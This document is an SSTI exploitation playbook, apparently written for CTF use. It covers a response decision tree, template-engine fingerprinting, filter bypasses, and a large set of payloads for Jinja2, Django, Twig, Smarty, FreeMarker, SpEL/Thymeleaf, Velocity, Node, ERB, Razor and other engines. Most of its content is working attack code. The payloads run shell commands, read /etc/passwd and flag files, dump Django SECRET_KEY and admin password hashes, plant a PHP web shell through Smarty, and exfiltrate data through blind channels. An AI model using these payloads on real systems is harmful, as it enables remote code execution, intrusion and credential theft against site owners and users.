# SSTI Bypass Playbook

Use response evidence to decide the next step, then choose payloads by context, filter conditions, and template engine. Do not treat this as a top-to-bottom payload spray list.

## Response Classification Decision Tree

For every entry, first save a normal canary, a valid business value, status code, response length, reflection location, and cookie/session changes. Then submit a minimal template probe and branch from the observed response.

```text
Numeric evaluation succeeds, such as 49 or 1097
Conclusion: server-side template evaluation is confirmed.
Action: fingerprint the engine immediately; stop expanding basic probes. Prefer context/config/source/env/common flag paths before RCE.

Object expansion, debug/context leakage, or template variables are parsed
Conclusion: template context is reached, but execution capability may not be confirmed.
Action: enumerate visible objects, filters, helpers, settings/session/request; choose the shortest low-risk information read.

template syntax error / internal server error / template stack trace
Conclusion: the input likely reached the template engine, but syntax family, closure, or context is wrong.
Action: preserve the error snippet and engine hint; switch to valid syntax for that engine or close the current expression/string/tag before injecting. Do not jump straight to RCE.

contains forbidden characters / forbidden input / WAF block
Conclusion: input is blocked before template rendering.
Action: locate blocked characters with single-character probes. If `{{` or `}}` is blocked, try `{% ... %}` statement tags, `${...}`, `#{...}`, `<%= ... %>`, view-name preprocessing, or moving keywords into parameters.

not a number / invalid rendered value / computed value rejected
Conclusion: the payload may have evaluated, but rendered output is rejected by a later business validator.
Action: keep the final output as a valid number/JSON/fixed prefix; move sensitive reads into conditions, statement blocks, timing, OOB, or file-write channels.

missing parameter / malformed JSON / bad request
Conclusion: the payload broke the request shape and does not prove SSTI.
Action: restore all required business fields and put one minimal payload in one field. Encode for URL/JSON/HTML as needed so the workflow remains valid.

Raw reflection / HTML escaping / JSON escaping
Conclusion: this may be plain reflection, or the current page may not consume the stored value yet.
Action: do not reject SSTI immediately. Check confirmation pages, previews, profile pages, exports, emails, error pages, background jobs, and next-step responses in the same session.

No visible output but status, length, timing, or async side effects change
Conclusion: possible blind execution, no-output template, queue consumer, or post-render validation.
Action: use boolean, time, error echo, OOB, static file writes, or observable state changes instead of direct-echo payloads.
```

## Black-Box Identification And Coverage

### Entry Coverage

Do not test only visible form inputs. For every candidate feature, keep a small table of entry, field, request shape, session state, response class, next action, and conclusion.

```text
request locations: query, form, JSON, multipart, path segment, matrix param, fragment when forwarded by frontend
state locations: cookie, session field, JWT claim, server-side profile, cart/draft/config value
header locations: Host, Referer, User-Agent, X-Forwarded-*, Accept-Language, Content-Type
template locations: template name, view name, include/partial/layout/helper name, email subject/body, export title
consumer locations: current response, next confirmation page, preview page, user page, admin page, error page, PDF/CSV/email/notification/queue job
```

### Baseline Comparison

For each entry, save at least these responses and compare only within the same entry, session, and business state:

```text
normal canary:        sstiCANARY123
valid business value: smallest normal value the feature accepts
syntax canary:        {{7*7}} / {{364|add:733}} / ${7*7} / #{7*7} / <%= 7*7 %>
character probes:     submit {, %, _, ., [, ], quotes, spaces, and parentheses separately
delayed consumers:    after submission, visit next-step pages, previews, exports, error pages, and admin-visible pages
```

Evidence priority:

```text
evaluated number / object expansion / debug data > template stack trace > boolean/time/OOB difference > raw reflection
```

### Engine Fingerprint Matrix

Do not use one Jinja payload to reject all SSTI. Narrow by response behavior:

```text
{{7*7}} -> 49                 Jinja2 / Twig / Nunjucks / Pebble / Jinjava / Handlebars-like
{{364|add:733}} -> 1097       Django Templates
${7*7} -> 49                  FreeMarker / Java EL / SpEL / Groovy / Mako-like
#{7*7} -> 49                  SpEL / Thymeleaf / FreeMarker legacy / Pug / Slim
<%= 7*7 %> -> 49              ERB / EJS / ASP / EEx / Mojolicious
@(7*7) -> 49                  Razor
{{printf "%d" 49}} -> 49      Go template
```

Django note: `{{7*7}}` is often not valid Django Template arithmetic. Prefer filters, `{% debug %}`, messages/settings/session probes, or `{{364|add:733}}`.

### Do Not Look Only At The Current Response

Some inputs are stored first and rendered later:

```text
GET form -> POST field -> session/cookie/server-side state -> next-step page -> final confirmation/API/email/export/error page
```

If a payload is reflected unchanged in the submit response, it may still evaluate on a later confirmation page, preview, admin view, export, error template, or second render.

### Separate Filters From Post-Validation

The same failure may come from different layers:

```text
Rejected before submit:       pre-template blacklist or parameter validation
500 template error:           engine reached, but syntax or context is wrong
Raw output:                   not evaluated, escaped, or evaluated elsewhere
Rejected after evaluation:    post-render validation checks rendered output
No output but slower/OOB:     blind execution or no-output context
```

If validation is post-render, make only the final rendered value valid. Sensitive reads, calculations, and conditions can live inside statement blocks:

```text
numeric field: output length, char ord values, decimal hash, per-character boolean/time decisions, or a fixed numeric sentinel
JSON field: keep JSON string/number syntax valid
fixed prefix: output a valid prefix, then use condition/time/OOB for data
no output: write a reachable static file, trigger DNS/HTTP OOB, or use sleep for boolean enumeration
```

## Confirmation And Escalation

### When To Confirm SSTI

Any strong signal is enough:

```text
Arithmetic/string expressions evaluate, such as {{7*7}} -> 49, {{'a'~'b'}} -> ab, or Django add -> 1097
Template objects, context, settings/config/session/request are expanded
Template-engine stack traces appear and syntax changes alter the response by template semantics
Boolean/time/OOB probes reproduce on the same entry and normal canaries do not show the same signal
```

Insufficient by itself:

```text
Only seeing a Twig/Jinja/Django version leak
Only seeing raw reflection or HTML escaping
Only seeing a 500 without template-engine features
Only seeing WAF/invalid-character messages without evaluation, stack trace, or delayed-consumer evidence
```

### When To Escalate

After confirming evaluation, move from low-risk to high-value:

```text
1. context/debug/settings/config/session/request/env/source leakage
2. read current working directory, template source, config files, common flag paths
3. verify command execution with the shortest id/whoami probe; do not start with large find commands
4. switch feedback channel based on constraints: direct echo, error echo, boolean, time, OOB, or file write
5. stop expanding payloads once you obtain the flag or decisive secret
```

### When To Converge Or Switch Entry

Record the conclusion and switch entry or consumer when:

```text
All syntax families are reflected unchanged and no later page/export/error consumer evaluates them
Single-character probes show all delimiters are filtered and there is no statement tag, alternate syntax, parameter outsourcing, or encoding path
The reachable object map has no file/config/command/business-secret access route
Time/OOB/file-write signals are not observable and the business flow has no visible side effect
```

## Contexts And Entries

### Template Text

When input becomes template source text, start with the relevant delimiters:

```text
{{7*7}}                 Jinja2 / Twig / Nunjucks / Pebble / Jinjava / Handlebars-like
${7*7}                  FreeMarker / Java EL / SpEL / Groovy / Mako-like
#{7*7}                  SpEL / Thymeleaf / FreeMarker legacy / Pug / Slim
<%= 7*7 %>              ERB / EJS / ASP / EEx / Mojolicious
@(1+2)                  Razor
[=3*3]                  FreeMarker alternate syntax
```

### Inside An Expression Or Variable Name

If input is spliced into an existing expression, close the current context before injecting:

```text
user}} {{7*7}} {{
user%}{{7*7}}{%
user') }}{{7*7}}{{ ('
user") }}{{7*7}}{{ ("
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

### Statement Tags Available, Expression Tags Restricted

When Jinja2, Twig, Nunjucks, Mako, or similar engines allow statement tags, bypass `{{...}}`:

```jinja2
{% if 7*7 == 49 %}49{% endif %}
{% set x = 7*7 %}49
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% with x = lipsum.__globals__['os'].popen('id').read() %}{{x}}{% endwith %}
{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %}OK{% endif %}
{% set x = cycler.__init__.__globals__.os.popen('id').read() %}{{x}}
```

If expression output is blocked by validation, put sensitive actions in a statement block and output only an allowed value:

```jinja2
{% set x = cycler.__init__.__globals__.__builtins__.open('/flag').read() %}123
{% if cycler.__init__.__globals__.__builtins__.open('/flag').read().startswith('flag{') %}1{% else %}0{% endif %}
```

These are shape examples. In a real target, replace the read target and encoding method according to available objects, filtered characters, and output format. If numeric output is required, prefer length, per-character boolean, time, hash, file-write, or OOB channels.

### Template Name, View Name, Include, Second Render

Many SSTI paths live in template names or second render points:

```text
Spring/Thymeleaf view name: __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
Twig include: {{ include('wp-config.php') }}
Jinja include/config: {{ config.from_pyfile('/tmp/x.py') }}
CMS/email/PDF/Markdown: save {{7*7}}, then trigger preview, send, export, or admin review
Handlebars layout/path: layout=../../routes/index.js or controllable partial/helper names may become LFI/RCE chains
```

### No Echo, Error, Time, OOB

The same execution chain can use different feedback channels:

```text
direct echo:     {{ lipsum.__globals__['os'].popen('id').read() }}
error echo:      {{ cycler.__init__.__globals__.__builtins__.getattr('', 'x' + cycler.__init__.__globals__.os.popen('id').read()) }}
boolean signal:  {{ 1 / (cycler.__init__.__globals__.os.popen('id')._proc.wait() == 0) }}
time signal:     {{ lipsum.__globals__['os'].popen('sleep 3').read() }}
OOB/file write:  {{ lipsum.__globals__['os'].popen('id > static/proof.txt').read() }}
```

## Filter Bypasses

### Blocked `{{` / `}}`

```jinja2
{% if 7*7 == 49 %}49{% endif %}
{% set x = 7*7 %}49
{% print(7*7) %}
{% if 7*7 == 49 %}OK{% endif %}
{% set x = cycler.__init__.__globals__.__builtins__.open('/flag').read() %}123
```

```text
${7*7}          Java/FreeMarker/Mako/Groovy
#{7*7}          SpEL/Thymeleaf/FreeMarker legacy/Pug/Slim
<%= 7*7 %>      ERB/EJS/ASP/EEx
@(1+2)          Razor
[=3*3]          FreeMarker
```

### Blocked `{` / `}`

```text
<%= `id` %>                                      ERB
<%= global.process.mainModule.require('child_process').execSync('id') %>  EJS
@(System.Diagnostics.Process.Start("cmd.exe","/c whoami"))                Razor
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x                   Thymeleaf view preprocessing
```

### Blocked `%`

```text
{{ lipsum.__globals__['os'].popen('id').read() }}   Jinja2 expression only
{{ cycler.__init__.__globals__.__builtins__.open('/flag').read() }} Jinja2 file read
${"freemarker.template.utility.Execute"?new()("id")} FreeMarker inline
{{['id']|map('system')|join}}                       Twig expression only
```

### Blocked `.`

```jinja2
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
```

```java
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
${T(java.lang.Runtime)['getRuntime']()['exec']('id')}
```

### Blocked `_`

```jinja2
{{ request|attr('\x5f\x5fclass\x5f\x5f') }}
{{ request|attr(["_"*2,"class","_"*2]|join) }}
{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}
```

```text
?f=%s%sclass%s%s&a=_
Pass __class__, __globals__, __builtins__, or __import__ through headers, cookies, or query parameters.
```

### Blocked `[` / `]`

```jinja2
{{ request|attr('__getitem__')('application')|attr('__getitem__')('__globals__') }}
{{ request|attr(request.args.getlist(request.args.l)|join) }}
```

```text
?l=a&a=_&a=_&a=class&a=_&a=_
```

### Blocked Quotes

```jinja2
{{ request|attr(request.args.c) }}                 ?c=__class__
{{ config.__class__.from_envvar.__globals__.import_string(request.args.m).popen(request.args.c).read() }}  ?m=os&c=id
```

```text
Java: T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))
FreeMarker: 9?lower_abc + 4?lower_abc              builds id
PHP/Twig: pass function names and commands through query parameters, then call map/call_user_func
Node: derive constructor, process, and mainModule from existing strings
```

### Blocked Spaces

```text
{{7*7}}
{{lipsum.__globals__['os'].popen('cat$IFS/etc/passwd').read()}}
{{['cat$IFS/etc/passwd']|map('system')|join}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<%=IO.popen('id').read%>
```

Command-space replacements:

```text
$IFS
${IFS}
tab/newline
cat</etc/passwd
pass /bin/sh,-c,id as ProcessBuilder/array arguments
```

### Blocked Parentheses

```twig
{{['id']|map('system')|join}}
{{['id']|filter('system')}}
```

```jinja2
{% if lipsum.__globals__['os'].popen('id').read().startswith('uid=') %}OK{% endif %}
```

```text
Razor: first confirm dynamic evaluation with @DateTime.Now or @Model.Property style expressions
Velocity: #set($x=...)$x
```

### Blocked Pipe `|`

```jinja2
{{ request.__class__ }}
{{ request['__class__'] }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```twig
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{dump(_context)}}
```

### Blocked Digits

```text
Jinja2: true+true, false, string length, range|length, slices of existing objects
Java: Boolean.TRUE.compareTo(false), Character.toString(...)
FreeMarker: true?string, ?length, ?index_of, lower_abc/upper_abc
Ruby/PHP/Node: string length, ord/chr, boolean arithmetic
```

### Blocked Letters

```text
Pass keywords through request parameters, headers, or cookies.
Build __globals__, os, id, or system with hex/unicode escapes.
Slice and concatenate names from existing strings.
Use short built-in objects: self, config, request, app, _context, cycler, joiner, lipsum, namespace.
```

### Blocked Keywords

```text
os        -> lipsum.__globals__['o'+'s'] / import_string('os') / request parameter
system    -> popen / passthru / shell_exec / call_user_func / ProcessBuilder / Runtime.exec / child_process
import    -> __builtins__['__import__'] / import_string / forName / constructor / _load
class     -> attr('__class__') / getClass() / TYPE / constructor
config    -> request.application / url_for.__globals__ / get_flashed_messages.__globals__
```

### Length Limits

```text
Jinja2 short chain: {{lipsum.__globals__['os'].popen('id').read()}}
Jinja2 externalized argument: {{lipsum.__globals__['os'].popen(request.args.c).read()}}&c=id
Twig short chain: {{['id']|map('system')|join}}
FreeMarker short chain: ${"freemarker.template.utility.Execute"?new()("id")}
Ruby short chain: <%=`id`%>
EEx short chain: <%=elem(System.shell("id"),0)%>
```

### Sandbox

```text
Jinja2: prefer lipsum/cycler/joiner/namespace.__globals__ over __subclasses__ offsets
Jinja2: config.__class__.from_envvar.__globals__.import_string('os').popen('id').read()
Twig: map/filter/reduce/sort with callables; _self.env/registerUndefinedFilterCallback on older versions
FreeMarker: when ?new is available use Execute; otherwise inspect ObjectWrapper/TemplateModel/business objects/classloader
SpEL/EL: if T(java.lang.Runtime) is blocked, use ''.getClass().forName(...) or request/session reflection
Node: process/mainModule/constructor/_load, helpers, prototype pollution, layout traversal
Ruby/ERB: Kernel, IO, Open3, backticks; Liquid/Mustache are weak by default, so look for custom filters/helpers
Go template: RCE depends on exposed methods; first test {{.}}, {{.Field}}, {{call .Fn "id"}}
```

### Autoescaping / HTML Escaping

SSTI execution and HTML escaping are separate. Consider HTML impact only when needed:

```jinja2
{{'<script>alert(1)</script>'|safe}}
```

For server-side execution, prioritize:

```text
numeric result, object stringification, errors, file content, command output, file write, OOB request
```

## Engine Payloads

### Jinja2 / Flask

```jinja2
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
{% debug %}
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
{{get_flashed_messages.__globals__.__builtins__.open('/flag').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.from_envvar.__globals__.import_string('os').popen('id').read()}}
```

Without `{{ }}`:

```jinja2
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% with x = lipsum.__globals__['os'].popen(request.args.c).read() %}{{x}}{% endwith %}
{% set x = cycler.__init__.__globals__.__builtins__.open('/flag').read() %}OK
{% if cycler.__init__.__globals__.__builtins__.open('/flag').read() %}1{% endif %}
```

When post-validation constrains output, first prove statement execution with fixed valid output, then recover content with length, per-character boolean, time, or numeric encoding.

Without `.`, `_`, or `[]` combinations:

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Django Templates

```django
{{364|add:733}}
{% debug %}
{{messages.storages.0.signer.key}}
{{settings.SECRET_KEY}}
{{request.session.items}}
{% include 'admin/base.html' %}
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.user.get_username}}:{{e.user.password}}{% endfor %}
{{'<script>alert(1)</script>'|safe}}
```

Django black-box priority:

```text
1. Use {{364|add:733}} or built-in filters to prove template evaluation; do not rely on Jinja arithmetic.
2. Try {% debug %} to see whether context is enumerable.
3. Inspect settings/session/messages/request objects. SECRET_KEY, database config, and debug settings are often more valuable than command execution.
4. In multi-step forms, check whether input is second-rendered on confirmation pages, user pages, messages, emails, exports, or error pages.
```

### Mako / Tornado / Bottle

```mako
${7*7}
<% import os; x=os.popen('id').read() %>${x}
${self.module.cache.util.os.popen('id').read()}
${self.template.__init__.__globals__['os'].popen('id').read()}
```

```tornado
{{7*7}}
{% import os %}{{os.popen('id').read()}}
```

### Twig

```twig
{{7*7}}
{{7*'7'}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
{{include('wp-config.php')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{{'id':'shell_exec'}|map('call_user_func')|join}}
{{[0]|reduce('system','id')}}
{{['cat$IFS/etc/passwd']|map('system')|join}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

No-quote mixing:

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

### Smarty / Blade / Latte

```smarty
{$smarty.version}
{php}echo `id`;{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

```blade
{{7*7}}
{{system('id')}}
{{passthru(request('c'))}}
```

```latte
{var $X="POC"}{$X}
{php system('id')}
```

### FreeMarker

```freemarker
${3*3}
#{3*3}
[=3*3]
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

String construction:

```freemarker
${9?lower_abc+4?lower_abc}
```

Older sandbox chain:

```freemarker
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

### SpEL / Java EL / Thymeleaf / OGNL

```java
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
[(7*7)]
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
```

OGNL:

```java
@java.lang.Integer@valueOf('1')
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
```

Java string construction:

```java
${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))}
```

### Velocity / Pebble / Jinjava / Groovy

```velocity
#set($x=7*7)$x
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($out=$p.getInputStream())
#foreach($i in [1..$out.available()])$out.read()#end
```

```pebble
{{someString.toUPPERCASE()}}
{{variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
```

```jinjava
{{'a'.toUpperCase()}}
{{request}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"id\"); x.start()")}}
```

```groovy
${9*9}
${new File('/etc/passwd').text}
${"id".execute().text}
${((char)105).toString()+((char)100).toString()}
```

### JavaScript / Node

EJS / Underscore:

```ejs
<%= 7*7 %>
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

Pug:

```pug
#{7*7}
#{root.process.mainModule.require('child_process').spawnSync('id').stdout}
```

Nunjucks:

```nunjucks
{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

Handlebars:

```handlebars
{{this}}
{{self}}
{{#with "s" as |string|}}{{#with string.sub as |sub|}}{{lookup sub "constructor"}}{{/with}}{{/with}}
```

Lodash:

```lodash
{{= _.VERSION}}
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

### Ruby / .NET / Go / Elixir / Perl

```erb
<%= 7*7 %>
<%= File.read('/etc/passwd') %>
<%= `id` %>
<%= IO.popen('id').read %>
<% require 'open3' %><% _i,o,_e,_t=Open3.popen3('id') %><%= o.read %>
```

```slim
#{7*7}
#{%x|id|}
```

```razor
@(1+2)
@System.Diagnostics.Process.Start("cmd.exe","/c whoami")
@{ var p = System.Diagnostics.Process.Start("/bin/sh","-c id"); }
```

```asp
<%= 7*7 %>
<%= CreateObject("Wscript.Shell").Exec("whoami").StdOut.ReadAll() %>
```

```gotemplate
{{ . }}
{{ .Password }}
{{ printf "%s" "ssti" }}
{{ call .System "id" }}
{{ .System "id" }}
```

```eex
<%= 7*7 %>
<%= File.read!("/etc/passwd") %>
<%= elem(System.shell("id"),0) %>
```

```mojo
<%= 7*7 %>
<%= qx(id) %>
```

## Tool Mapping

```text
TInjA      multi-engine polyglot fingerprinting and SSTI/CSTI triage
SSTImap    automated enumeration and interactive shell after URL/parameter/body are known
tplmap     older environments, Python 2 compatibility chains, or historical payload comparison
Fenjing    Jinja2/Flask payload generation under strong filters
```
